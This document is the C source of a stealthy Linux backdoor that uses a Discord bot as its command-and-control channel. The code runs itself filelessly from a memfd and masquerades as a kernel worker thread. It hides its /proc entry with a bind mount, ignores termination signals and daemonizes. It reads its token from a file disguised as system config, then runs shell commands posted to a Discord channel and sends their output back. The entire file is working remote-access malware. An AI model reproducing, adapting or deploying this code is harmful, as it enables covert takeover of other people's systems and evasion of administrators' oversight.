#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <unistd.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <ctype.h>
#include <errno.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/mount.h>


#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

#ifndef PR_SET_MM
#define PR_SET_MM              35
#endif
#ifndef PR_SET_MM_EXE_FILE
#define PR_SET_MM_EXE_FILE     13
#endif

#define MAX_PROCESS 2
#define POLL_SLEEP 2
#define RECENT_CAP 200
#define TOKEN_FILE "/etc/cron.conf"
#define ID_MAX_LEN 64

static const char *GUILD_ID = "1415674125816434742";
static const char *LOG_DIR = "/var/cache/systemd-private-17fbcd29a89f4598a26f3f21791b3918-apache2.service-V9WpOP";
static const char *LOG_FILE = "/etc/dhcpcd.conf";
static const char *API_BASE = "https://discord.com/api/v10";
static const char *PROC_NAME = "[kworker/u:0]";

struct string { char *ptr; size_t len; };
struct msg { char *id; char *content; char *author_id; };

static char *BOT_TOKEN = NULL;
static char BOT_USER_ID[64] = {0};
static char *recent_keys[RECENT_CAP];
static size_t recent_count = 0;
static int running = 1;

static int memfd_create_wrapper(const char *name, unsigned int flags) {
    return syscall(__NR_memfd_create, name, flags);
}

static void memfd_self_exec(void) {
    // Check if already running from memfd
    if (getenv("_MEMFD_EXEC")) {
        return;
    }
    
    // Create memfd and copy self
    int mfd = memfd_create_wrapper("", MFD_CLOEXEC);
    if (mfd < 0) return;
    
    int sfd = open("/proc/self/exe", O_RDONLY);
    if (sfd < 0) {
        close(mfd);
        return;
    }
    
    struct stat st;
    fstat(sfd, &st);
    
    char *buf = malloc(st.st_size);
    if (!buf) {
        close(sfd);
        close(mfd);
        return;
    }
    
    read(sfd, buf, st.st_size);
    write(mfd, buf, st.st_size);
    free(buf);
    close(sfd);
    
    // Set flag and re-exec
    setenv("_MEMFD_EXEC", "1", 1);
    
    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", mfd);
    
    // Remove CLOEXEC
    fcntl(mfd, F_SETFD, 0);
    
    // Get current argv
    extern char **environ;
    char *argv[] = { (char *)PROC_NAME, NULL };
    
    execve(fd_path, argv, environ);
    
    // If we get here, exec failed
    close(mfd);
}

static void init_string(struct string *s) {
    s->len = 0;
    s->ptr = malloc(1);
    if (!s->ptr) { fprintf(stderr,"malloc failed\n"); exit(1); }
    s->ptr[0] = '\0';
}

static size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string *s) {
    size_t add = size * nmemb;
    size_t new_len = s->len + add;
    s->ptr = realloc(s->ptr, new_len + 1);
    if (!s->ptr) { fprintf(stderr,"realloc failed\n"); exit(1); }
    memcpy(s->ptr + s->len, ptr, add);
    s->ptr[new_len] = '\0';
    s->len = new_len;
    return add;
}

static char *read_token_from_file(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd == -1) {
        fprintf(stderr, "Failed to open %s: %s\n", path, strerror(errno));
        return NULL;
    }
    
    char buf[256];
    ssize_t n = read(fd, buf, sizeof(buf)-1);
    close(fd);
    
    if (n <= 0) return NULL;
    buf[n] = '\0';
    
    char *token = strstr(buf, "DISCORD_BOT_TOKEN=");
    if (!token) return NULL;
    
    token += strlen("DISCORD_BOT_TOKEN=");
    char *end = strchr(token, '\n');
    if (end) *end = '\0';
    end = strchr(token, '\r');
    if (end) *end = '\0';
    
    return strdup(token);
}

static char *make_api_request(const char *method, const char *endpoint, const char *data, long *out_code) {
    CURL *curl = curl_easy_init();
    if (!curl) return NULL;
    
    struct string s;
    init_string(&s);
    
    char url[1024];
    snprintf(url, sizeof(url), "%s%s", API_BASE, endpoint);
    
    struct curl_slist *headers = NULL;
    char auth_hdr[1024];
    snprintf(auth_hdr, sizeof(auth_hdr), "Authorization: Bot %s", BOT_TOKEN);
    headers = curl_slist_append(headers, auth_hdr);
    headers = curl_slist_append(headers, "Content-Type: application/json");
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "discord-bot/1.0");
    //curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    
    if (strcasecmp(method, "GET") == 0)
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
    else if (strcasecmp(method, "POST") == 0) {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        if (data) curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
    }
    
    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    if (res == CURLE_OK)
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    else
        fprintf(stderr, "[curl] error: %s\n", curl_easy_strerror(res));
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    *out_code = http_code;
    return s.ptr;
}

static int file_exists(const char *path) {
    struct stat st;
    return stat(path, &st) == 0 && st.st_size > 0;
}

static char *json_escape(const char *s) {
    size_t len = strlen(s);
    char *out = malloc(len * 4 + 1);
    char *p = out;
    for (size_t i = 0; i < len; ++i) {
        char c = s[i];
        if (c == '\\' || c == '\"' || c == '\n') {
            *p++ = '\\';
            if (c == '\n') *p++ = 'n';
            else *p++ = c;
        } else *p++ = c;
    }
    *p = '\0';
    return out;
}

static char *extract_id(const char *p) {
    const char *q = p;
    while (*q && *q != '\"') q++;
    size_t n = q - p;
    if (n == 0) return NULL;
    char *id = malloc(n+1);
    strncpy(id, p, n);
    id[n] = '\0';
    return id;
}

static char *extract_content(const char *start) {
    const char *cpos = strstr(start, "\"content\":\"");
    if (!cpos) return NULL;
    cpos += strlen("\"content\":\"");
    
    size_t cap = 256;
    char *tmp = malloc(cap);
    if (!tmp) return NULL;
    
    size_t ti = 0;
    int escaped = 0;
    const char *q = cpos;
    
    while (*q) {
        if (*q == '\"' && !escaped) break;
        if (*q == '\\' && !escaped) {
            escaped = 1;
            q++;
            continue;
        }
        if (escaped) {
            char c = (*q == 'n') ? '\n' : (*q == 'r') ? '\r' : (*q == 't') ? '\t' : *q;
            if (ti + 1 >= cap) {
                cap *= 2;
                tmp = realloc(tmp, cap);
                if (!tmp) return NULL;
            }
            tmp[ti++] = c;
            escaped = 0;
            q++;
        } else {
            if (ti + 1 >= cap) {
                cap *= 2;
                tmp = realloc(tmp, cap);
                if (!tmp) return NULL;
            }
            tmp[ti++] = *q++;
        }
    }
    tmp[ti] = '\0';
    char *out = strdup(tmp);
    free(tmp);
    return out;
}

static char *extract_author(const char *start) {
    const char *p = strstr(start, "\"author\":");
    if (!p) return NULL;
    p = strstr(p, "\"id\":\"");
    if (!p) return NULL;
    p += strlen("\"id\":\"");
    return extract_id(p);
}

static struct msg *collect_messages(const char *resp, size_t *cnt) {
    const char *p = resp;
    struct msg *arr = NULL;
    size_t cap = 0, count = 0;
    
    while ((p = strstr(p, "\"id\":\"")) != NULL) {
        const char *valstart = p + strlen("\"id\":\"");
        char *id = extract_id(valstart);
        if (!id) {
            p = valstart;
            continue;
        }
        
        const char *objstart = p;
        while (objstart > resp && *objstart != '{') objstart--;
        
        char *content = extract_content(objstart);
        char *author = extract_author(objstart);
        
        if (count + 1 > cap) {
            cap = cap ? cap*2 : 8;
            arr = realloc(arr, cap * sizeof(struct msg));
            if (!arr) { free(id); return NULL; }
        }
        
        arr[count].id = id;
        arr[count].content = content;
        arr[count].author_id = author;
        count++;
        p = valstart;
    }
    
    *cnt = count;
    return arr;
}

static void add_recent(const char *aid, const char *content) {
    if (!aid || !content) return;
    
    size_t keylen = strlen(aid) + strlen(content) + 2;
    char *key = malloc(keylen);
    if (!key) return;
    
    snprintf(key, keylen, "%s|%s", aid, content);
    
    if (recent_count >= RECENT_CAP) {
        free(recent_keys[0]);
        memmove(recent_keys, recent_keys+1, (RECENT_CAP-1) * sizeof(char*));
        recent_keys[RECENT_CAP-1] = key;
    } else {
        recent_keys[recent_count++] = key;
    }
}

static int is_recent(const char *aid, const char *content) {
    if (!aid || !content) return 0;
    
    for (size_t i = 0; i < recent_count; i++) {
        char *k = recent_keys[i];
        if (!k) continue;
        
        size_t aidlen = strlen(aid);
        if (strncmp(k, aid, aidlen) == 0 && k[aidlen] == '|' &&
            strcmp(k + aidlen + 1, content) == 0) return 1;
    }
    return 0;
}

static void post_msg(const char *cid, const char *msg) {
    char ep[256];
    snprintf(ep, sizeof(ep), "/channels/%s/messages", cid);
    
    char *esc = json_escape(msg);
    char body[4096];
    snprintf(body, sizeof(body), "{\"content\": \"%s\"}", esc);
    free(esc);
    
    long code;
    char *r = make_api_request("POST", ep, body, &code);
    if (r) free(r);
}

static void bind_shm_to_self(void) {
    char proc_path[64];
    char task_path[64];
    pid_t pid = getpid();
    
    snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
    snprintf(task_path, sizeof(task_path), "/proc/%d/task", pid);
    
    // Mount task directory over proc directory
    if (mount(task_path, proc_path, NULL, MS_BIND | MS_SILENT, NULL) != 0) {
        fprintf(stderr, "[!] Failed to bind mount %s to %s: %s\n", 
                task_path, proc_path, strerror(errno));
    } else {
        fprintf(stderr, "[+] Bind-mounted %s over %s\n", task_path, proc_path);
    }
}

static void run_cmd(const char *cid, const char *cmd) {
    if (!cmd || !*cmd) {
        post_msg(cid, "[empty command]");
        return;
    }
    
    fprintf(stderr, "[EXEC] %s\n", cmd);
    
    char full_cmd[4096];
    snprintf(full_cmd, sizeof(full_cmd), "%s 2>&1", cmd);
    
    FILE *fp = popen(full_cmd, "r");
    if (!fp) {
        post_msg(cid, "[popen failed]");
        return;
    }
    
    setvbuf(fp, NULL, _IONBF, 0);
    
    char buf[8192];
    char line[8192];
    int line_pos = 0;
    int c;
    char output[1900] = {0};
    int line_count = 0;
    int total_sent = 0;
    int first_line = 1;
    
    // Read character by character to build lines properly
    while ((c = fgetc(fp)) != EOF) {
        if (c == '\n' || line_pos >= sizeof(line) - 1) {
            line[line_pos] = '\0';
            
            // Skip empty lines after first line
            if (line_pos == 0 && !first_line) {
                line_pos = 0;
                continue;
            }
            
            first_line = 0;
            
            // Send if buffer would overflow
            if (strlen(output) + line_pos + 2 > 1900 || line_count >= 3) {
                if (strlen(output) > 0) {
                    post_msg(cid, output);
                    total_sent++;
                    sleep(1);
                    output[0] = '\0';
                    line_count = 0;
                }
            }
            
            if (line_count > 0) {
                strcat(output, "\n");
            }
            strcat(output, line);
            line_count++;
            
            line_pos = 0;
        } else {
            line[line_pos++] = c;
        }
    }
    
    // Handle last line if not empty
    if (line_pos > 0) {
        line[line_pos] = '\0';
        
        if (strlen(output) + line_pos + 2 > 1900) {
            if (strlen(output) > 0) {
                post_msg(cid, output);
                total_sent++;
                sleep(1);
                output[0] = '\0';
            }
        }
        
        if (strlen(output) > 0) {
            strcat(output, "\n");
        }
        strcat(output, line);
    }
    
    // Send remaining output
    if (strlen(output) > 0) {
        post_msg(cid, output);
        total_sent++;
        sleep(1);
    }
    
    int status = pclose(fp);
    
    if (total_sent == 0) {
        if (status == 0) {
            post_msg(cid, "[no output]");
        } else {
            char err[256];
            snprintf(err, sizeof(err), "[command failed with status %d]", status);
            post_msg(cid, err);
        }
    }
}

static int create_dir(const char *path) {
    struct stat st;
    if (stat(path, &st) == 0) return S_ISDIR(st.st_mode) ? 0 : -1;
    return mkdir(path, 0755);
}

static char *read_id(const char *path) {
    if (!file_exists(path)) return NULL;
    
    FILE *f = fopen(path, "r");
    if (!f) return NULL;
    
    char buf[128];
    char *id = NULL;
    
    if (fgets(buf, sizeof(buf), f)) {
        char *nl = strchr(buf, '\n');
        if (nl) *nl = '\0';
        
        int ok = 1, len = strlen(buf);
        if (len < 16 || len > 22) ok = 0;
        for (int i = 0; i < len && ok; i++)
            if (!isdigit((unsigned char)buf[i])) ok = 0;
        
        if (ok) id = strdup(buf);
    }
    
    fclose(f);
    return id;
}

static void write_id(const char *path, const char *id) {
    FILE *f = fopen(path, "w");
    if (f) {
        fprintf(f, "%s\n", id);
        fclose(f);
    }
}

static void handle_signal(int sig) {
    running = 0;
}

int main(int argc, char *argv[]) {
    // First, relocate to memfd if not already done
    memfd_self_exec();
    
    // Set up environment
    setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);
    setenv("SHELL", "/bin/bash", 1);
    setenv("HOME", "/root", 1);
    
    // Ignore termination signals (but not SIGCHLD)
    signal(SIGHUP, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    signal(SIGQUIT, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    // DON'T ignore SIGCHLD - it breaks popen()
    
    // Fork to detach from terminal
    pid_t pid = fork();
    if (pid < 0) {
        return 1;
    }
    
    // Parent exits
    if (pid > 0) {
        return 0;
    }
    
    // Child becomes session leader
    setsid();
    
    // Fork again
    pid = fork();
    if (pid < 0) {
        return 1;
    }
    
    if (pid > 0) {
        return 0;
    }
    
    // Now we're a daemon
    chdir("/");
    umask(0);
    
    // Close all file descriptors
    for (int i = 0; i < sysconf(_SC_OPEN_MAX); i++) {
        close(i);
    }
    
    // Redirect to /dev/null
    open("/dev/null", O_RDWR);
    dup(0);
    dup(0);
    
    // Rename process
    prctl(PR_SET_NAME, PROC_NAME);
    bind_shm_to_self();

    if (argc > 0 && argv[0]) {
        memset(argv[0], 0, strlen(argv[0]));
        strcpy(argv[0], PROC_NAME);
    }
    
    // Now run the bot
    BOT_TOKEN = read_token_from_file(TOKEN_FILE);
    if (!BOT_TOKEN) {
        return 1;
    }
    
    create_dir(LOG_DIR);
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    char *CHANNEL_ID = read_id(LOG_FILE);
    
    if (!CHANNEL_ID) {
        char randname[32];
        srand(time(NULL) ^ getpid());
        const char *chars = "abcdefghijklmnopqrstuvwxyz0123456789";
        for (int i = 0; i < 6; i++)
            randname[i] = chars[rand() % 36];
        randname[6] = '\0';
        
        char chan_name[64];
        snprintf(chan_name, sizeof(chan_name), "sess_%s", randname);
        
        char body[256];
        snprintf(body, sizeof(body), "{\"name\":\"%s\",\"type\":0}", chan_name);
        
        long code;
        char ep[256];
        snprintf(ep, sizeof(ep), "/guilds/%s/channels", GUILD_ID);
        
        char *resp = make_api_request("POST", ep, body, &code);
        
        if (code == 201 && resp) {
            char *found = strstr(resp, "\"id\":\"");
            if (found) {
                found += strlen("\"id\":\"");
                char *q = found;
                while (*q && *q != '\"') q++;
                size_t n = q - found;
                if (n > 0) {
                    CHANNEL_ID = malloc(n+1);
                    strncpy(CHANNEL_ID, found, n);
                    CHANNEL_ID[n] = '\0';
                    write_id(LOG_FILE, CHANNEL_ID);
                }
            }
            free(resp);
        } else {
            if (resp) free(resp);
            curl_global_cleanup();
            free(BOT_TOKEN);
            return 1;
        }
    }
    
    // Get bot user ID
    long code;
    char *resp = make_api_request("GET", "/users/@me", NULL, &code);
    if (resp && code == 200) {
        char *p = strstr(resp, "\"id\":\"");
        if (p) {
            p += strlen("\"id\":\"");
            char *q = p;
            while (*q && *q != '\"') q++;
            size_t n = q - p;
            if (n > 0 && n < sizeof(BOT_USER_ID)) {
                strncpy(BOT_USER_ID, p, n);
                BOT_USER_ID[n] = '\0';
            }
        }
    }
    if (resp) free(resp);
    
    // Send startup message
    char ep[256];
    snprintf(ep, sizeof(ep), "/channels/%s/messages", CHANNEL_ID);
    char body[128];
    snprintf(body, sizeof(body), "{\"content\":\"Bot started\"}");
    resp = make_api_request("POST", ep, body, &code);
    if (resp) free(resp);
    
    // Get last seen message
    char *LAST_SEEN = NULL;
    snprintf(ep, sizeof(ep), "/channels/%s/messages", CHANNEL_ID);
    resp = make_api_request("GET", ep, NULL, &code);
    if (resp && code == 200) {
        char *p = strstr(resp, "\"id\":\"");
        if (p) {
            p += strlen("\"id\":\"");
            char *q = p;
            while (*q && *q != '\"') q++;
            size_t n = q - p;
            if (n > 0) {
                LAST_SEEN = malloc(n+1);
                strncpy(LAST_SEEN, p, n);
                LAST_SEEN[n] = '\0';
            }
        }
    }
    if (resp) free(resp);
    
    int backoff = 1;
    
    while (1) {
        snprintf(ep, sizeof(ep), "/channels/%s/messages", CHANNEL_ID);
        resp = make_api_request("GET", ep, NULL, &code);
        
        if (!resp) { 
            sleep(POLL_SLEEP);
            continue; 
        }
        
        if (code == 429) {
            const char *p = strstr(resp, "\"retry_after\":");
            int retry = backoff;
            if (p) {
                p += strlen("\"retry_after\":");
                retry = atoi(p);
                if (retry <= 0) retry = backoff;
            }
            free(resp);
            sleep(retry);
            if (backoff < 64) backoff *= 2;
            continue;
        }
        
        backoff = 1;
        
        if (code != 200) {
            free(resp);
            sleep(POLL_SLEEP);
            continue;
        }
        
        size_t msg_cnt = 0;
        struct msg *msgs = collect_messages(resp, &msg_cnt);
        
        if (!msgs || msg_cnt == 0) {
            if (msgs) free(msgs);
            free(resp);
            sleep(POLL_SLEEP);
            continue;
        }
        
        if (!LAST_SEEN) {
            LAST_SEEN = strdup(msgs[0].id);
        } else {
            int found_index = -1;
            
            // Find where our last seen message is
            for (size_t i = 0; i < msg_cnt; i++) {
                if (msgs[i].id && strcmp(msgs[i].id, LAST_SEEN) == 0) {
                    found_index = i;
                    break;
                }
            }
            
            if (found_index == -1) {
                free(LAST_SEEN);
                LAST_SEEN = strdup(msgs[0].id);
            } else if (found_index > 0) {
                // Process ONLY THE NEWEST MESSAGE (index 0)
                struct msg *m = &msgs[0];
                const char *content = m->content ? m->content : "";
                const char *aid = m->author_id ? m->author_id : "";
                
                if (*content && !(m->author_id && *BOT_USER_ID && strcmp(m->author_id, BOT_USER_ID) == 0)) {
                    
                    // Check if it's a command
                    if (strncmp(content, "/cmd", 4) == 0 || strncmp(content, "!cmd", 4) == 0) {
                        const char *cmd_text = content + 4;
                        while (*cmd_text == ' ') cmd_text++;
                        if (*cmd_text) {
                            // Make a copy of the command
                            char *cmd_copy = strdup(cmd_text);
                            if (cmd_copy) {
                                run_cmd(CHANNEL_ID, cmd_copy);
                                free(cmd_copy);
                            }
                        } else {
                            post_msg(CHANNEL_ID, "[no command]");
                        }
                    }
                }
                
                free(LAST_SEEN);
                LAST_SEEN = strdup(msgs[0].id);
            }
        }
        
        // Free message array
        for (size_t i = 0; i < msg_cnt; i++) {
            free(msgs[i].id);
            free(msgs[i].content);
            free(msgs[i].author_id);
        }
        free(msgs);
        free(resp);
        
        sleep(POLL_SLEEP);
    }
    
    // Never reached
    free(CHANNEL_ID);
    free(LAST_SEEN);
    free(BOT_TOKEN);
    for (size_t i = 0; i < recent_count; i++) free(recent_keys[i]);
    curl_global_cleanup();
    
    return 0;
}
